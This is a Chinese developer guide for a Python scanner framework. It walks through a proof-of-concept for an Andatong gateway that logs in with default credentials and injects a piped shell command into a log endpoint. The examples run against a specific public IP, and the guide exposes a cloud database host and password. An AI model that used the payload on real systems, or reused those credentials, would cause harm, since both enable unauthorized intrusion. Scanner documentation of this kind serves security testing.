# CScanPoc

CScan Poc 开发文档。

## 接口概述

接口集中在 `CScanPoc.lib.api` 中定义。

- `ABVuln` : 漏洞抽象类，定义漏洞相关字段，具体的漏洞应该继承该类
- `ABPoc` : 漏洞验证扫描抽象类，定义 POC 的接口，具体的 POC 继承它，实现相关接口，使用 `output` 输出执行、报告数据。一般来说一个`ABPoc`（扫描程序）实现对一个`ABVuln`（漏洞）的验证；一个 POC 也可以关联、实现多个漏洞的扫描。

## 使用说明

### 开发环境

依赖使用 [pipenv](https://github.com/pypa/pipenv) 管理，具体安装参见[pipenv#installation](https://github.com/pypa/pipenv#installation)。PyCharm 中设定 pipenv 可见[这里](https://stackoverflow.com/questions/46251411/how-do-i-properly-setup-pipenv-in-pycharm)。

建议添加环境变量 `PIPENV_VENV_IN_PROJECT=1` （比如在 `~/.bashrc` 中加 `export PIPENV_VENV_IN_PROJECT=1`），这样，virtualenv 将被安装到项目根目录 ~.venv~ 中。

pipenv 安装好之后，进入项目根目录（含有 Pipfile 文件的目录），执行`pipenv install`，然后执行`pipenv install '-e .' --dev` 安装 CScanPoc 到本地环境。执行`pipenv shell`在当前虚拟环境中启动 shell。

这时，你可以执行 `python CScanPoc/template.py -u http://www.targetsite.com` 执行测试代码。

格式化代码：`./.venv/bin/autopep8 --in-place <要格式化的文件>`

或者格式化一个目录中所有代码： `for i in $(find <要格式化的目录> -name '*.py'); do echo $i; ./.venv/bin/autopep8 --in-place $i; done`


### 漏洞编写

下面以 [http://vul.hu0g4.com/index.php/2017/11/21/5.html](http://vul.hu0g4.com/index.php/2017/11/21/5.html) 中的使用弱口令登陆后，存在远程命令执行为例，进行编写这个漏洞的 POC。

首先导入相关接口：

```python
# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
```

然后定义漏洞信息，它继承自 `ABVuln`：

```python
class Vuln(ABVuln):
    vuln_id = '' # 平台漏洞编号，留空
    name = '安达通网关3g/g3/log命中执行漏洞' # 漏洞名称
    level = VulnLevel.SEVERITY # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''
        安达通网关系统存在默认口令，用户名root 密码changeit。
        可通过该账户登录系统,在'3g/g3/log'页面存在命令执行漏洞，
        可直接执行系统命令,来获取系统权限。
    ''' # 漏洞描述
    ref = 'http://vul.hu0g4.com/index.php/2017/11/21/5.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    product = 'IAM网关控制台'  # 漏洞应用名称
    product_version = 'x.6.660'  # 漏洞应用版本
```

下面开始书写该漏洞的 poc 代码，继承自 `ABPoc`，定义作者和该 poc 的编写时间：

```python
class Poc(ABPoc):
    author = 'CScan'  # POC编写者
    create_date = '2018-3-24' #POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        <<验证代码>>

    def exploit(self):
        super(Poc, self).exploit()
```

注意到其中 `__init__` 中的代码，它说明了该 poc 扫描的漏洞是上面定义的 `Vuln` 漏洞。

下面以验证部分代码为例介绍一下 `ABPoc` 为我们提供的接口。`<<验证代码>>` 部分如下，注意阅读其中注释部分：

```python
post_data = {'username': 'root', 'password': 'changeit'}
code_exec = {'line': '1|echo \'vuln\''}

try:
    # self.vuln: 当前扫描的漏洞
    # self.target: 扫描目标
    path = '{url}/home/login'.format(url=self.target)
    s = requests.Session()
    # self.output.info: 执行日志、流程信息的打印
    self.output.info('使用用户信息 {up} 访问 {path}'.format(path=path, up=post_data))
    response = s.post(path, data=post_data)

    if response.content == '1':
        # self.output.warn: 扫描特定漏洞发现的疑似漏洞信息打印
        self.output.warn(self.vuln, '发现弱口令 {up}'.format(up=post_data))

        path = self.target + '/3g/g3/log'
        self.output.info('发送 payload={0} 到 {1}'.format(code_exec, path))
        result = s.post(path, data=code_exec)

        if 'vuln' in result.content:
            # self.output.report: 扫描到的漏洞信息的打印
            self.output.report(
                self.vuln,
                "目标 {url} 存在 /3g/g3/log 任意命令执行漏洞".format(url=self.target))
except Exception, e:
    self.output.info('执行异常{}'.format(e))
```

方便用于调试，添加 `main` 行：

```python
if __name__ == '__main__':
    # run 会解析命令行参数 -u 到 target 中
    Poc().run()
```

此时一个漏洞的 POC 就书写完毕，完整代码在 `CScanPoc/pocs/andatong_exec.py` 中，可以执行测试：

```python
python CScanPoc/pocs/andatong_exec.py -u http://221.224.120.187:8080
```

### 漏洞编写-一个 POC 验证多个漏洞

还是以前面那个漏洞为例，实际上从上面的漏洞描述可以看出这实际包含两个漏洞。

1.  默认口令： 用户名 root 密码 changeit
2.  命令执行： 登陆后 '3g/g3/log' 页面存在命令执行漏洞，可直接执行系统命令，获取系统权限。

因此我们可以定义两个漏洞：

```python
class AdtDefaultAuthInfoVuln(ABVuln):
    vuln_id = '' # 平台漏洞编号，留空
    name = '安达通网关默认口令' # 漏洞名称
    level = VulnLevel.SEVERITY # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''安达通网关系统存在默认口令，用户名root 密码changeit。''' # 漏洞描述
    ref = 'http://vul.hu0g4.com/index.php/2017/11/21/5.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    product = 'IAM网关控制台'  # 漏洞应用名称
    product_version = 'x.6.660'  # 漏洞应用版本

class AdtRCEVuln(ABVuln):
    vuln_id = '' # 平台漏洞编号，留空
    name = '安达通网关命令执行' # 漏洞名称
    level = VulnLevel.SEVERITY # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''
        安达通网关系统登陆后在 '3g/g3/log'' 存在命令执行漏洞，
        可执行系统命令获取系统权限。
    ''' # 漏洞描述
    ref = 'http://vul.hu0g4.com/index.php/2017/11/21/5.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    product = 'IAM网关控制台'  # 漏洞应用名称
    product_version = 'x.6.660'  # 漏洞应用版本
```

对应 poc 可以这样写。

```python
class Poc(ABPoc):
    author = 'CScan'  # POC编写者
    create_date = '2018-3-24' #POC创建时间

    def __init__(self):
        super(Poc, self).__init__({
            'auth': AdtDefaultAuthInfoVuln(),
            'rce': AdtRCEVuln()
        })

    def verify(self):
        post_data = {'username': 'root', 'password': 'changeit'}
        code_exec = {'line': '1|echo \'vuln\''}

        try:
            # self.vuln: 当前扫描的漏洞
            # self.target: 扫描目标
            path = '{url}/home/login'.format(url=self.target)
            s = requests.Session()
            # self.output.info: 执行日志、流程信息的打印
            self.output.info('使用用户信息 {up} 访问 {path}'.format(path=path, up=post_data))
            response = s.post(path, data=post_data)

            if response.content == '1':
                # self.output.warn: 扫描特定漏洞发现的疑似漏洞信息打印
                self.output.warn(self.vuln['auth'], '发现弱口令 {up}'.format(up=post_data))

                path = self.target + '/3g/g3/log'
                self.output.info('发送 payload={0} 到 {1}'.format(code_exec, path))
                result = s.post(path, data=code_exec)

                if 'vuln' in result.content:
                    # self.output.report: 扫描到的漏洞信息的打印
                    self.output.report(
                        self.vuln['rce'],
                        "目标 {url} 存在 /3g/g3/log 任意命令执行漏洞".format(url=self.target))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
```

这段示例代码放在 `CScanPoc/pocs/andatong_exec_1.py`，同样，你可以执行测试：

```python
python CScanPoc/pocs/andatong_exec_1.py -u http://221.224.120.187:8080
```

# 编译与发布

## Docker 支持

编译 CScanPoc 基础镜像，进入项目根目录，执行 `docker build -t cscanpoc .`。

新建 poc 镜像，例如 `andatong_exec.py`，

1.  新建目录，如 `andatong`
2.  将 `andatong_exec.py` 拷入该目录
3.  在目录中新建 `Dockerfile` 文件，添加内容：

    ```Dockerfile
    FROM cscanpoc

    COPY andatong_exec.py /app/main.py

    ENTRYPOINT [ "pipenv",  "run", "python", "main.py" ]
    ```

4.  在目录中执行 `docker build -t andatong_exec .` 生成名为`andatong_exec` 的镜像
5.  测试执行： `docker run --rm andatong_exec -u http://221.224.120.187:8080`

## 批量编译与同步

```sh
root@Scan:~/CScan-POC/scanner/python/CScanPoc# pwd
/root/CScan-POC/scanner/python/CScanPoc

root@Scan:~/CScan-POC/scanner/python/CScanPoc# pipenv run python scripts/sync.py --host rm-bp1917k62kyd0f29u5o.mysql.rds.aliyuncs.com --user root --db cscan --pass CScanConfig1314 --target CScanPoc/pocs/ --vuln --poc --insert --build-base-image cscan-poc-base:0.1
```
